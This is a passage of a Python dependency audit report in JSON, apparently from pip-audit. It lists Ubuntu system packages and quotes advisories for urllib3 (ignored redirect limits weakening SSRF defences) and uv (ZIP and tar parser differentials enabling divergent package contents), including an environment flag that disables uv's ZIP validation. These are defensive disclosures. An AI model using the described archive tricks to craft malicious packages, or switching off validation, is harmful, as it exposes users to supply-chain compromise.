(0.0.0)"}, {"name": "ubuntu-pro-client", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-pro-client (8001)"}, {"name": "ufw", "skip_reason": "Dependency not found on PyPI and could not be audited: ufw (0.36.2)"}, {"name": "unattended-upgrades", "skip_reason": "Dependency not found on PyPI and could not be audited: unattended-upgrades (0.1)"}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.3.0", "vulns": [{"id": "GHSA-48p4-8xcf-vxj5", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50182"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}]}, {"name": "usb-creator", "skip_reason": "Dependency not found on PyPI and could not be audited: usb-creator (0.3.16)"}, {"name": "uv", "version": "0.6.3", "vulns": [{"id": "GHSA-8qf3-x8v5-2pj8", "fix_versions": ["0.8.6"], "aliases": ["CVE-2025-54368"], "description": "## Impact  In versions 0.8.5 and earlier of uv, remote ZIP archives were handled in a streamwise fashion, and file entries were not reconciled against the archive's central directory. This enabled two parser differentials against other Python package installers:  1. An attacker could contrive a ZIP archive that would extract with legitimate contents on some package installers, and malicious contents on others due to multiple local file entries. The attacker could choose which installer to target. 2. An attacker could contrive a \"stacked\" ZIP input with multiple internal ZIPs, which would be handled differently by different package installers. The attacker could choose which installer to target.  In both cases, the outcome is that an attacker can produce a ZIP with a consistent digest that expands differently with different installers.  The [ZIP standard](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT) is ambiguous with respect to these behavior differentials. Consequently, these same differentials may be accepted ZIP parsers other than those used in uv. This advisory is for uv in particular, but all consumers of ZIP-based Python package distributions, e.g., pip, are potentially susceptible to similar parser differentials in other ZIP parsers.  The practical impact of these differentials is limited by a number of factors:  - To be compromised via this vulnerability, user interaction of some sort is required. In particular, the user must run `uv install $package` with an attacker-controlled `$package`. - When using wheel distributions, installation of the malicious package is not sufficient for execution of malicious code, the vicim would need to perform a separate invocation, e.g., `python -c \"import $package\"`. - If a ZIP-based source distribution (which are less common than tarball source distributions), is encountered, malicious code can be executed during package resolution or installation. uv may invoke the malicious code when building the source distribution into a wheel. - The practical impact of these differentials is limited by a coordinated fix to [Warehouse](https://github.com/pypi/warehouse), PyPI's backend: Warehouse now rejects ZIPs exhibiting these differentials, limiting the ability of an attacker to distribute malicious ZIP distributions via PyPI. As part of that coordinated fix, a review of Warehouse revealed no evidence of exploitation.  ## Patches  Versions 0.8.6 and newer of uv address both of the parser differentials above, by refusing to process ZIPs with duplicated local file entries or stacked contents.  ## Workarounds  Users are advised to upgrade to 0.8.6 or newer to address this advisory.  Most users should experience no breaking changes as a result of the patch above. However, users who do experience breakage should carefully review their distributions for signs of malicious intent. Users may choose to set `UV_INSECURE_NO_ZIP_VALIDATION=1` to revert to the previous behavior.  ## Attribution  This vulnerability was discovered separately by two different individuals: Caleb Brown (Google) and Tim Hatch (Netflix)."}, {"id": "GHSA-w476-p2h3-79g9", "fix_versions": ["0.9.5"], "aliases": [], "description": "### Impact  In versions 0.9.4 and earlier of uv, tar archives containing PAX headers with file size overrides were not handled properly. As a result, an attacker could contrive a source distribution (as a tar archive) that would extract differently when installed via uv versus other Python package installers.  The underlying parsing differential here originates with astral-tokio-tar, which disclosed this vulnerability as CVE-2025-62518.  In practice, the impact of this vulnerability is **low**: only source distributions can be formatted as tar archives, and source distributions execute arbitrary code at build/installation time by definition. Consequently, a parser differential in tar extraction is strictly less powerful than the capabilities already exposed to an attacker who has the ability to control source distributions.   However, this particular source of malleability in source distributions is unintentional and not operating by design, and therefore we consider it a vulnerability despite its overlap in capabilities with intended behavior.  ### Patches  Versions 0.9.5 and newer of uv address the vulnerability above. Users should upgrade to 0.9.5 or newer.  ### Workarounds  Users are advised to upgrade to version 0.9.5 or newer to address this advisory.  Users should experience no breaking changes as a result of the patch above.  ### References  * See CVE-2025-62518 for the corresponding advisory against astral-tokio-tar"}, {"id": "GHSA-pqhf-p39g-3x64", "fix_versions": ["0.9.6"], "aliases": [], "description": "### Impact  In versions 0.9.5 and earlier of uv, ZIP archives were handled in a manner that enabled two parsing differentials against other components of the Python packaging ecosystem:  1. Central directory entries in a ZIP archive can contain comment fields. However, uv would assume that these fields were not present, since they aren't widely used. Consequently, a ZIP archive could be constructed where uv would interpret the contents of a central directory comment field as ZIP control structures (such as a new central directory entry), rather than skipping over them. 2. Both local file entries and central directory entries contain filename fields, which are used to place archive members on disk. These fields are arbitrary sequences of bytes, and may therefore be invalid or ambiguous. For example, they may contain ASCII null bytes, in which case different ZIP extractors behave differently: Python's `zipfile` module truncates the filename at the first null, while uv would skip (not extract) any archive members whose filenames contained nulls. Because of this difference, a ZIP archive could be constructed that would extract differently across different Python package installers.  In both cases, the outcome is that an attacker may be able to produce a ZIP with a consistent digest that expands differently with different Python package installers.  Like with GHSA-8qf3-x8v5-2pj8, the impact of these differentials is limited by a number of factors:  - To be compromised via this vulnerability, user interaction of some sort is required. In particular, the user must run `uv pip install $package` or similar with an attacker-controlled $package. When using wheel distributions, installation of the malicious package is not sufficient for execution of malicious code, the vicim would need to perform a separate invocation, e.g., `python -c \"import $package\"`. - If a ZIP-based source distribution (which are less common than tarball source distributions), is encountered, malicious code can be executed during package resolution or installation. uv may invoke the malicious code when building the source distribution into a wheel.  ### Patches  Versions 0.9.6 and newer of uv address both of the parser differentials above, by properly handling comments in central directory entries and by refusing to process ZIPs that contain filename fields that are unlikely to be interpreted consistently across other ZIP parser implementations.  ### Workarounds  Users are advised to upgrade to 0.9.6 or newer to address this advisory.  Most users should experience no breaking changes as a result of the patch above. However, users who do experience breakage should carefully review their distributions for signs of malicious intent. Users may choose to set `UV_INSECURE_NO_ZIP_VALIDATION=1` to revert to the previous behavior.  ### Attribution  This vulnerability was disclosed by Caleb Brown (Google)."}]}, {"name": "uvicorn", "version": "0.23.2", "vulns": []}, {"name": "uvloop", "version": "0.21.0", "vulns": []}, {"name": "wadllib", "version": "1.3.6", "vulns": []}, {"name": "watchfiles", "version": "1.0.4", "vulns": []}, {"name": "wcwidth", "version": "0.2.13", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "15.0", "vulns": []}, {"name": "wheel", "version": "0.42.0", "vulns": []}, {"name": "wrapt", "version": "1.17.2", "vulns": []}, {"name": "xdg", "version": "5", "vulns": []}, {"name": "xkit", "skip_reason": "Dependency not found on PyPI and could not be audited: xkit (0.0.0)"}, {"name": "yarl", "version": "1.18.3", "vulns": []}, {"name": "yt-dlp", "version": "2025.8.27", "vulns": []}, {"name": "zipp", "version": "3.21.0", "vulns": []}], "fixes": []}
